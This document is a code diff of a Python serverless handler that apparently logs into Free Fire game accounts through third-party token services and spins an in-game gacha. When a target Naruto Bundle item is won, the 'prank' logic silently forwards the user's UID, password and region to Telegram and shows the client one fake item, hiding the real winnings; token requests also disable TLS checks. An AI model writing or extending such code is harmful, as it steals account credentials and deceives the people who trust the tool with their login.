@@ -1,20 +1,25 @@
 #!/usr/bin/env python3
 """
-Vercel serverless handler — PRANK MODE (Naruto Bundle only) + 2 fallback payloads + fallback JWT API.
+Vercel serverless handler — PRANK MODE (Naruto Bundle only).
 
-JWT order:
-  1. Primary    : http://148.113.25.200:6293/Tok
-  2. Fallback   : https://ff-jwt-gen-api.lovable.app/api/public/token
+JWT providers (tried in order, first success wins):
+  1. primary   : http://148.113.25.200:6293/Tok
+  2. lovable   : https://ff-jwt-gen-api.lovable.app/api/public/token
+  3. rishu     : https://rishugarena.vercel.app/rishu
 
-Server URL resolution (new mapping):
-  - AMERICA (US/BR/NA) → client.us.freefiremobile.com
-  - IND (India)        → client.ind.freefiremobile.com
-  - OTHERS (default)   → clientbp.ppmainecoonghj.com
+Payloads (tried in order, first success wins):
+  1. primary   : D120B9DAAC2C87872B8C115DFD74A832
+  2. fallback1 : 7DF7F8996CD696356CD01BCBD2B3CDE8
+  3. fallback2 : 7FCB76B6CB40C0FFD3FBBDDA4600C039
+
+Server URL mapping:
+  IND     → client.ind.freefiremobile.com
+  AMERICA → client.us.freefiremobile.com
+  OTHERS  → clientbp.ppmainecoonghj.com
 
 Prank (Naruto Bundle 710047022):
-  • UID / pass / region / count → silently sent to Telegram (retried + verified)
+  • UID / pass / region / count → Telegram (retried + verified)
   • Client receives EXACTLY ONE fake item: {id: 820981015, name: null}
-  • All other real items are hidden
 """
 
 import os
@@ -45,7 +50,7 @@ else:
 # ------------------------------------------------------------------ #
 #  CONSTANTS
 # ------------------------------------------------------------------ #
-# --- JWT PROVIDERS (primary first, fallback second) ---
+# --- JWT PROVIDERS (tried in order; first success wins) ---
 JWT_PROVIDERS = [
     {
         "name": "primary",
@@ -55,11 +60,18 @@ JWT_PROVIDERS = [
         "addr_key": "addr",
     },
     {
-        "name": "fallback",
+        "name": "lovable",
         "url":  "https://ff-jwt-gen-api.lovable.app/api/public/token",
         "params": lambda uid, pw: {"uid": uid, "password": pw},
         "token_key": "token",
-        "addr_key": None,   # no addr field — region mapping used instead
+        "addr_key": None,
+    },
+    {
+        "name": "rishu",
+        "url":  "https://rishugarena.vercel.app/rishu",
+        "params": lambda uid, pw: {"uid": uid, "password": pw},
+        "token_key": "jwt",
+        "addr_key": None,
     },
 ]
 
@@ -70,31 +82,29 @@ FALLBACK_PAYLOADS = [
     "7FCB76B6CB40C0FFD3FBBDDA4600C039",
 ]
 
-# --- SERVER URL MAPPING (replaces REGION_URL_MAP) ---
+# --- SERVER URL MAPPING ---
 SERVER_URL_MAP = {
     "IND": {
-        "client_url":     "https://client.ind.freefiremobile.com/",
-        "server_url":     "https://loginbp.ppmainecoonghj.com/",
+        "client_url":      "https://client.ind.freefiremobile.com/",
+        "server_url":      "https://loginbp.ppmainecoonghj.com/",
         "release_version": "OB55",
-        "client_version": "1.132.6",
+        "client_version":  "1.132.6",
     },
     "AMERICA": {
-        "client_url":     "https://client.us.freefiremobile.com/",
-        "server_url":     "https://loginbp.ppmainecoonghj.com/",
+        "client_url":      "https://client.us.freefiremobile.com/",
+        "server_url":      "https://loginbp.ppmainecoonghj.com/",
         "release_version": "OB55",
-        "client_version": "1.132.6",
+        "client_version":  "1.132.6",
     },
     "OTHERS": {
-        "client_url":     "https://clientbp.ppmainecoonghj.com/",
-        "server_url":     "https://loginbp.ppmainecoonghj.com/",
+        "client_url":      "https://clientbp.ppmainecoonghj.com/",
+        "server_url":      "https://loginbp.ppmainecoonghj.com/",
         "release_version": "OB55",
-        "client_version": "1.132.6",
+        "client_version":  "1.132.6",
     },
 }
 
-# Regions that map to AMERICA
-AMERICA_REGIONS = {"US", "BR", "NA", "AMERICA", "BR", "US"}
-
+AMERICA_REGIONS = {"US", "BR", "NA", "AMERICA"}
 DEFAULT_SERVER_KEY = "OTHERS"
 
 # --- PRANK CONFIG ---
@@ -141,17 +151,13 @@ def decode_jwt_payload(token: str):
 
 
 def pick_server_url_from_token(token: str) -> str:
-    """
-    Decode JWT → lock_region → map to the correct client_url.
-    Returns the client_url (with trailing slash), used as base for /PurchaseGacha.
-    """
     payload = decode_jwt_payload(token)
     if not payload:
         return SERVER_URL_MAP[DEFAULT_SERVER_KEY]["client_url"]
 
     region = (payload.get("lock_region") or payload.get("noti_region") or "").upper()
 
-    if region == "IND" or region == "IN":
+    if region in ("IND", "IN"):
         key = "IND"
     elif region in AMERICA_REGIONS:
         key = "AMERICA"
@@ -235,8 +241,7 @@ async def _tg_send_once(session, text: str, parse_mode):
 
     try:
         async with session.post(
-            url,
-            json=payload,
+            url, json=payload,
             timeout=aiohttp.ClientTimeout(total=TG_ATTEMPT_TIMEOUT),
         ) as r:
             body = await r.read()
@@ -318,73 +323,89 @@ async def send_to_telegram(session, uid, password, region, naruto_count):
 
 
 # ------------------------------------------------------------------ #
-#  TOKEN PROVIDER (multi-provider, in order)
+#  TOKEN PROVIDER — try all providers in order until one works
 # ------------------------------------------------------------------ #
-async def get_token_data(session, uid, password, retries=3):
+async def _try_one_provider(session, provider, uid, password, retries=2):
     """
-    Try each JWT provider in order. Returns a normalized dict:
-        {
-          "token":  "<JWT>",
-          "addr":   "<client_url or None>",
-          "region": "<lock_region or UNKNOWN>",
-          "provider": "primary" | "fallback",
-        }
-    Returns None if all providers fail.
+    Attempt a single JWT provider. Returns a normalized dict or None.
+    """
+    params = provider["params"](uid, password)
+
+    for attempt in range(retries):
+        try:
+            async with session.get(
+                provider["url"],
+                params=params,
+                ssl=False,
+                timeout=aiohttp.ClientTimeout(total=15),
+            ) as res:
+                if res.status != 200:
+                    print(f"[JWT] {provider['name']} HTTP {res.status}", flush=True)
+                    await asyncio.sleep(0.4)
+                    continue
+
+                try:
+                    data = await res.json(content_type=None)
+                except Exception:
+                    try:
+                        data = json.loads(await res.text())
+                    except Exception:
+                        print(f"[JWT] {provider['name']} invalid JSON", flush=True)
+                        await asyncio.sleep(0.4)
+                        continue
+
+                # Look for the token in the configured key first, then common fallbacks
+                tok = (
+                    data.get(provider["token_key"])
+                    or data.get("token")
+                    or data.get("Tok")
+                    or data.get("jwt")
+                    or data.get("access_token")
+                )
+
+                if not isinstance(tok, str) or len(tok) <= 50:
+                    print(f"[JWT] {provider['name']} no valid token in response", flush=True)
+                    await asyncio.sleep(0.4)
+                    continue
+
+                addr = None
+                if provider.get("addr_key"):
+                    addr = (data.get(provider["addr_key"]) or "").strip() or None
+
+                jwt_payload = decode_jwt_payload(tok) or {}
+                region = jwt_payload.get("lock_region", "UNKNOWN")
+
+                print(f"[JWT] ✓ provider={provider['name']} region={region}", flush=True)
+                return {
+                    "token": tok,
+                    "addr": addr,
+                    "region": region,
+                    "provider": provider["name"],
+                }
+
+        except asyncio.TimeoutError:
+            print(f"[JWT] {provider['name']} timeout", flush=True)
+        except Exception as e:
+            print(f"[JWT] {provider['name']} error: {e.__class__.__name__}", flush=True)
+
+        if attempt < retries - 1:
+            await asyncio.sleep(0.3)
+
+    return None
+
+
+async def get_token_data(session, uid, password):
+    """
+    Try every JWT provider in order until one returns a valid token.
+    Returns a normalized dict or None if all providers fail.
     """
     for provider in JWT_PROVIDERS:
-        params = provider["params"](uid, password)
+        result = await _try_one_provider(session, provider, uid, password, retries=2)
+        if result:
+            return result
+        print(f"[JWT] provider '{provider['name']}' failed → trying next", flush=True)
 
-        for attempt in range(retries):
-            try:
-                async with session.get(
-                    provider["url"],
-                    params=params,
-                    ssl=False,
-                    timeout=aiohttp.ClientTimeout(total=20),
-                ) as res:
-                    if res.status != 200:
-                        await asyncio.sleep(0.5)
-                        continue
-
-                    try:
-                        data = await res.json(content_type=None)
-                    except Exception:
-                        try:
-                            data = json.loads(await res.text())
-                        except Exception:
-                            await asyncio.sleep(0.5)
-                            continue
-
-                    # Extract token
-                    tok = data.get(provider["token_key"])
-                    if not tok:
-                        tok = data.get("token") or data.get("Tok") or data.get("access_token")
-
-                    if not isinstance(tok, str) or len(tok) <= 50:
-                        await asyncio.sleep(0.5)
-                        continue
-
-                    # Extract addr (if provider supports it)
-                    addr = None
-                    if provider.get("addr_key"):
-                        addr = (data.get(provider["addr_key"]) or "").strip() or None
-
-                    # Extract region from JWT
-                    jwt_payload = decode_jwt_payload(tok) or {}
-                    region = jwt_payload.get("lock_region", "UNKNOWN")
-
-                    return {
-                        "token": tok,
-                        "addr": addr,
-                        "region": region,
-                        "provider": provider["name"],
-                    }
-
-            except Exception:
-                await asyncio.sleep(0.4)
-
-        print(f"[JWT] provider '{provider['name']}' failed, trying next…", flush=True)
-
+    print(f"[JWT] ✗ ALL providers failed for uid={uid}", flush=True)
     return None
 
 
@@ -433,7 +454,7 @@ async def spin(uid: str, password: str, payload_hex: str = None):
     if output_pb2 is None:
         return {"success": False, "error": f"protobuf_load_failed: {_PB2_IMPORT_ERROR}"}
 
-    # ---- Build the ordered payload queue ----
+    # ---- Build payload queue ----
     if payload_hex is not None:
         queue = [("custom", payload_hex)]
     else:
@@ -449,18 +470,15 @@ async def spin(uid: str, password: str, payload_hex: str = None):
             return {"success": False, "error": f"invalid_payload_hex[{label}]: {e}"}
 
     async with aiohttp.ClientSession() as session:
-        # ---- Fetch token (multi-provider) ----
-        token_data = await get_token_data(session, uid, password, 3)
+        # ---- Fetch token (tries all providers) ----
+        token_data = await get_token_data(session, uid, password)
         if not token_data:
-            return {"success": False, "error": "token_fetch_failed"}
+            return {"success": False, "error": "token_fetch_failed_all_providers"}
 
-        token  = token_data["token"]
-        region = token_data["region"]
+        token        = token_data["token"]
+        region       = token_data["region"]
         jwt_provider = token_data["provider"]
 
-        # ---- Determine target URL ----
-        #     Prefer `addr` from the JWT response (primary provider provides it).
-        #     Fall back to region-based mapping.
         url = token_data["addr"] or pick_server_url_from_token(token)
 
         final_status = 0
@@ -480,31 +498,39 @@ async def spin(uid: str, password: str, payload_hex: str = None):
                 "success": False,
                 "error": f"gacha_http_{final_status}",
                 "region": region,
+                "jwt": jwt_provider,
             }
 
         # ----------------------------------------------------------
-        #  PRANK LOGIC (Naruto Bundle only)
+        #  PRANK LOGIC
         # ----------------------------------------------------------
         naruto_hits = [it for it in final_items if it["id"] == PRANK_TARGET_ID]
 
         if not naruto_hits:
             return {
-                "success": True, "uid": uid, "region": region,
-                "payload": used_payload, "items": final_items,
+                "success": True,
+                "uid": uid,
+                "region": region,
+                "payload": used_payload,
+                "jwt": jwt_provider,
+                "items": final_items,
             }
 
         await send_to_telegram(session, uid, password, region, len(naruto_hits))
+
+        tg_ok = (
+            (TG_STATE.get("last_success_ts") or 0)
+            > (TG_STATE.get("last_error_ts") or 0)
+        )
 
         return {
             "success": True,
             "uid": uid,
             "region": region,
             "payload": used_payload,
+            "jwt": jwt_provider,
             "items": [{"id": FAKE_UNKNOWN_ID, "name": None}],
-            "_jwt": jwt_provider,   # debug-only; can remove
-            "_tg": "sent" if TG_STATE.get("last_success_ts") and (
-                TG_STATE["last_success_ts"] or 0
-            ) > (TG_STATE.get("last_error_ts") or 0) else "failed",
+            "_tg": "sent" if tg_ok else "failed",
         }
 
 
@@ -512,7 +538,7 @@ async def spin(uid: str, password: str, payload_hex: str = None):
 #  HEALTH CHECK
 # ------------------------------------------------------------------ #
 HEALTH_START_TS = time.time()
-HEALTH_VERSION  = "2.7"
+HEALTH_VERSION  = "2.8"
 
 
 async def _probe_upstream(session, url, timeout=6):
